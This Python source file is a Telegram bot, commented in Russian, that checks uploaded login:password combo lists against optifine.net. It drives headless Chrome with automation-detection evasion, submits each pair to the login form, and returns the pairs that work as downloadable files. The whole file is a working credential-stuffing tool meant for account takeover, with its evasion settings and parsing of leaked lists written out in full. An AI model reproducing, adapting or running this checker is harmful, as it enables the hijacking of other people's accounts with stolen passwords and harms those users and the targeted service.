import os
import logging
import asyncio
import aiofiles
import time
import random
from datetime import datetime
from typing import Dict, List, Tuple

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Конфиг
TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_IDS = os.environ.get('ADMIN_IDS', '').split(',')
ADMIN_IDS = [int(id.strip()) for id in ADMIN_IDS if id.strip()]
ALLOWED_USERS = ADMIN_IDS.copy() if ADMIN_IDS else []

# Статистика
bot_stats = {
    'total': 0,
    'valid': 0,
    'invalid': 0,
    'start_time': datetime.now()
}

class OptifineChecker:
    """Проверка аккаунтов на Optifine.net"""
    
    def __init__(self):
        self.driver = None
    
    def setup_driver(self):
        """Настройка Chrome для работы"""
        chrome_options = Options()
        
        # Основные настройки
        chrome_options.add_argument('--headless=new')
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        chrome_options.add_argument('--disable-gpu')
        chrome_options.add_argument('--window-size=1920,1080')
        
        # Отключаем лишнее для скорости
        chrome_options.add_argument('--disable-blink-features=AutomationControlled')
        chrome_options.add_argument('--ignore-certificate-errors')
        chrome_options.add_argument('--disable-web-security')
        
        # Маскировка
        chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
        
        chrome_options.add_experimental_option('excludeSwitches', ['enable-automation'])
        chrome_options.add_experimental_option('useAutomationExtension', False)
        
        # Путь к ChromeDriver
        chromedriver_path = '/usr/local/bin/chromedriver'
        if not os.path.exists(chromedriver_path):
            chromedriver_path = '/usr/bin/chromedriver'
        
        try:
            service = Service(chromedriver_path)
            self.driver = webdriver.Chrome(service=service, options=chrome_options)
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            return True
        except Exception as e:
            logger.error(f"Ошибка запуска Chrome: {e}")
            return False
    
    async def check_account(self, login: str, password: str) -> Dict:
        """Проверка одного аккаунта на Optifine.net"""
        
        if not self.driver:
            if not self.setup_driver():
                return {
                    'login': login,
                    'status': 'error',
                    'error': 'Chrome не запустился'
                }
        
        try:
            logger.info(f"🔍 Проверяю: {login[:20]}...")
            
            # 1. Заходим на страницу входа Optifine
            self.driver.get('https://optifine.net/login')
            
            # Ждем загрузку страницы
            WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.TAG_NAME, "body"))
            )
            
            time.sleep(2)  # Небольшая задержка для загрузки всех элементов
            
            # 2. Ищем поля ввода
            try:
                # Поле логина (на Optifine это может быть username или email)
                login_selectors = [
                    "input[name='username']",
                    "input[name='email']",
                    "input[type='text']",
                    "#username",
                    "#email",
                    "input[name='login']"
                ]
                
                login_input = None
                for selector in login_selectors:
                    try:
                        login_input = self.driver.find_element(By.CSS_SELECTOR, selector)
                        break
                    except:
                        continue
                
                if not login_input:
                    return {
                        'login': login,
                        'status': 'error',
                        'error': 'Не найдено поле логина'
                    }
                
                # Поле пароля
                password_selectors = [
                    "input[name='password']",
                    "input[type='password']",
                    "#password",
                    "#pass"
                ]
                
                password_input = None
                for selector in password_selectors:
                    try:
                        password_input = self.driver.find_element(By.CSS_SELECTOR, selector)
                        break
                    except:
                        continue
                
                if not password_input:
                    return {
                        'login': login,
                        'status': 'error',
                        'error': 'Не найдено поле пароля'
                    }
                
                # Кнопка входа
                button_selectors = [
                    "button[type='submit']",
                    "input[type='submit']",
                    ".login-button",
                    "#login",
                    "button:contains('Login')"
                ]
                
                submit_button = None
                for selector in button_selectors:
                    try:
                        submit_button = self.driver.find_element(By.CSS_SELECTOR, selector)
                        break
                    except:
                        continue
                
                # 3. Вводим данные
                login_input.clear()
                login_input.send_keys(login)
                time.sleep(0.5)
                
                password_input.clear()
                password_input.send_keys(password)
                time.sleep(0.5)
                
                # 4. Отправляем форму
                if submit_button:
                    submit_button.click()
                else:
                    # Если кнопка не найдена, пробуем Enter
                    password_input.submit()
                
                # 5. Ждем результат
                time.sleep(3)
                
                # 6. Проверяем результат
                current_url = self.driver.current_url
                page_source = self.driver.page_source.lower()
                
                # Критерии успешного входа
                success_indicators = [
                    'dashboard' in current_url,
                    'profile' in current_url,
                    'account' in current_url,
                    'my-account' in current_url,
                    'logout' in page_source,
                    'log out' in page_source,
                    'welcome' in page_source,
                    'successfully logged in' in page_source
                ]
                
                if any(success_indicators):
                    logger.info(f"✅ Найден рабочий: {login[:20]}")
                    return {
                        'login': login,
                        'password': password,
                        'status': 'valid'
                    }
                
                # Критерии ошибки
                error_indicators = [
                    'invalid' in page_source,
                    'incorrect' in page_source,
                    'wrong' in page_source,
                    'error' in page_source,
                    'failed' in page_source,
                    'not found' in page_source,
                    'does not exist' in page_source
                ]
                
                if any(error_indicators):
                    logger.info(f"❌ Неверный: {login[:20]}")
                    return {
                        'login': login,
                        'status': 'invalid',
                        'error': 'Неверный логин/пароль'
                    }
                
                # Если непонятно - считаем невалидным
                return {
                    'login': login,
                    'status': 'invalid',
                    'error': 'Не удалось определить'
                }
                
            except NoSuchElementException as e:
                logger.error(f"Элемент не найден: {e}")
                return {
                    'login': login,
                    'status': 'error',
                    'error': 'Страница изменилась'
                }
            
        except TimeoutException:
            logger.error("Таймаут загрузки страницы")
            return {
                'login': login,
                'status': 'error',
                'error': 'Таймаут'
            }
        except WebDriverException as e:
            logger.error(f"Ошибка WebDriver: {e}")
            # Пробуем перезапустить Chrome
            self.close()
            return {
                'login': login,
                'status': 'error',
                'error': 'Chrome упал'
            }
        except Exception as e:
            logger.error(f"Ошибка: {e}")
            return {
                'login': login,
                'status': 'error',
                'error': str(e)[:50]
            }
    
    def close(self):
        """Закрытие браузера"""
        if self.driver:
            try:
                self.driver.quit()
            except:
                pass
            self.driver = None

# Создаем экземпляр
checker = OptifineChecker()

async def process_file(file_path, update, context):
    """Обработка файла с аккаунтами"""
    
    results = {
        'valid': [],
        'invalid': [],
        'errors': []
    }
    
    msg = await update.message.reply_text(
        "🚀 **Запускаю проверку Optifine.net...**\n"
        "⏳ Пожалуйста, подождите"
    )
    
    try:
        # Читаем файл
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        
        # Парсим аккаунты
        lines = content.strip().split('\n')
        accounts = []
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
            
            # Пробуем разные разделители
            for sep in [':', ';', '|', '\t']:
                if sep in line:
                    parts = line.split(sep, 1)
                    if len(parts) == 2 and parts[0] and parts[1]:
                        accounts.append((parts[0].strip(), parts[1].strip()))
                        break
        
        total = len(accounts)
        
        if total == 0:
            await msg.edit_text("❌ **Нет аккаунтов в файле**")
            return
        
        await msg.edit_text(
            f"📥 **Файл:** {update.message.document.file_name}\n"
            f"📊 **Аккаунтов:** {total}\n\n"
            f"🔄 **Начинаю проверку...**"
        )
        
        start_time = time.time()
        
        # Проверяем каждый аккаунт
        for i, (login, password) in enumerate(accounts, 1):
            # Обновляем прогресс каждые 5 аккаунтов
            if i % 5 == 0 or i == total:
                elapsed = time.time() - start_time
                await msg.edit_text(
                    f"📊 **Прогресс:** {i}/{total}\n"
                    f"✅ **Рабочих:** {len(results['valid'])}\n"
                    f"⏱ **Время:** {elapsed:.1f}с\n\n"
                    f"🔄 **Проверяю:** {login[:15]}..."
                )
            
            # Проверка аккаунта
            result = await checker.check_account(login, password)
            
            # Сортируем результаты
            if result['status'] == 'valid':
                results['valid'].append(result)
                bot_stats['valid'] += 1
            elif result['status'] == 'invalid':
                results['invalid'].append(result)
                bot_stats['invalid'] += 1
            else:
                results['errors'].append(result)
                bot_stats['invalid'] += 1
            
            bot_stats['total'] += 1
            
            # Небольшая задержка между аккаунтами
            await asyncio.sleep(1)
        
        # Сохраняем результаты
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Файл с рабочими аккаунтами
        if results['valid']:
            valid_file = f"✅_РАБОЧИЕ_{len(results['valid'])}шт_{timestamp}.txt"
            async with aiofiles.open(valid_file, 'w', encoding='utf-8') as f:
                for acc in results['valid']:
                    await f.write(f"{acc['login']}:{acc['password']}\n")
            
            with open(valid_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=valid_file,
                    caption=f"✅ **Рабочих аккаунтов: {len(results['valid'])}**"
                )
            os.remove(valid_file)
        
        # Файл с нерабочими
        if results['invalid']:
            invalid_file = f"❌_НЕРАБОЧИЕ_{len(results['invalid'])}шт_{timestamp}.txt"
            async with aiofiles.open(invalid_file, 'w', encoding='utf-8') as f:
                for acc in results['invalid']:
                    await f.write(f"{acc['login']}:{acc['password']}\n")
            
            with open(invalid_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=invalid_file,
                    caption=f"❌ **Нерабочих аккаунтов: {len(results['invalid'])}**"
                )
            os.remove(invalid_file)
        
        # Файл с ошибками
        if results['errors']:
            error_file = f"⚠️_ОШИБКИ_{len(results['errors'])}шт_{timestamp}.txt"
            async with aiofiles.open(error_file, 'w', encoding='utf-8') as f:
                for acc in results['errors']:
                    await f.write(f"{acc['login']}:{acc['password']} | Ошибка: {acc.get('error', 'unknown')}\n")
            
            with open(error_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=error_file,
                    caption=f"⚠️ **Ошибок при проверке: {len(results['errors'])}**"
                )
            os.remove(error_file)
        
        # Итог
        elapsed = time.time() - start_time
        minutes = int(elapsed // 60)
        seconds = int(elapsed % 60)
        
        await update.message.reply_text(
            f"✅ **ПРОВЕРКА ЗАВЕРШЕНА!**\n\n"
            f"📊 **Статистика:**\n"
            f"• Всего аккаунтов: {total}\n"
            f"• ✅ Рабочих: {len(results['valid'])}\n"
            f"• ❌ Нерабочих: {len(results['invalid'])}\n"
            f"• ⚠️ Ошибок: {len(results['errors'])}\n\n"
            f"⏱ **Время:** {minutes}м {seconds}с"
        )
        
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

# Команды
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Старт"""
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ **Нет доступа**")
        return
    
    uptime = datetime.now() - bot_stats['start_time']
    hours = int(uptime.seconds // 3600)
    minutes = int((uptime.seconds // 60) % 60)
    
    keyboard = [
        [InlineKeyboardButton("📊 Статистика", callback_data='stats')],
        [InlineKeyboardButton("❓ Помощь", callback_data='help')]
    ]
    
    await update.message.reply_text(
        f"👋 **Optifine Account Checker**\n\n"
        f"🔍 **Проверяет аккаунты на optifine.net**\n\n"
        f"📥 **Отправь .txt файл** с логинами и паролями\n"
        f"Формат: логин:пароль (каждый с новой строки)\n\n"
        f"📊 **Статистика:**\n"
        f"• Проверено всего: {bot_stats['total']}\n"
        f"• Найдено рабочих: {bot_stats['valid']}\n\n"
        f"⏱ **Работаю:** {hours}ч {minutes}мин",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Кнопки"""
    query = update.callback_query
    await query.answer()
    
    if query.data == 'stats':
        uptime = datetime.now() - bot_stats['start_time']
        hours = int(uptime.seconds // 3600)
        minutes = int((uptime.seconds // 60) % 60)
        
        await query.edit_message_text(
            f"📊 **СТАТИСТИКА**\n\n"
            f"Всего проверено: {bot_stats['total']}\n"
            f"✅ Рабочих: {bot_stats['valid']}\n"
            f"❌ Нерабочих: {bot_stats['invalid']}\n\n"
            f"⏱ Аптайм: {hours}ч {minutes}мин"
        )
    
    elif query.data == 'help':
        await query.edit_message_text(
            "❓ **КАК ПОЛЬЗОВАТЬСЯ**\n\n"
            "1️⃣ Создай текстовый файл (.txt)\n"
            "2️⃣ В каждой строке: логин:пароль\n"
            "3️⃣ Отправь файл боту\n\n"
            "📌 **Пример:**\n"
            "`user1@mail.com:password123`\n"
            "`player123:qwerty456`\n"
            "`steve:123456`\n\n"
            "⚡️ **Результат:**\n"
            "• ✅ рабочие аккаунты\n"
            "• ❌ нерабочие аккаунты\n"
            "• ⚠️ ошибки проверки"
        )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Получение файла"""
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ **Нет доступа**")
        return
    
    doc = update.message.document
    
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ **Нужен .txt файл**")
        return
    
    if doc.file_size > 10 * 1024 * 1024:  # 10 MB
        await update.message.reply_text(f"❌ **Файл > 10 МБ** ({doc.file_size / 1024 / 1024:.1f} МБ)")
        return
    
    try:
        await update.message.reply_text(
            f"📥 **Файл получен:** {doc.file_name}\n"
            f"📦 **Размер:** {doc.file_size / 1024:.1f} КБ\n\n"
            f"🔄 **Запускаю проверку...**"
        )
        
        file = await context.bot.get_file(doc.file_id)
        path = f"temp_{update.effective_user.id}_{doc.file_name}"
        await file.download_to_drive(path)
        await process_file(path, update, context)
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")

def main():
    """Запуск"""
    if not TOKEN:
        print("❌ НЕТ ТОКЕНА!")
        return
    
    print("=" * 50)
    print("🚀 ЗАПУСК OPTIFINE CHECKER")
    print("=" * 50)
    
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print("✅ БОТ РАБОТАЕТ! Жду файлы...")
    
    try:
        app.run_polling()
    finally:
        checker.close()

if __name__ == '__main__':
    main()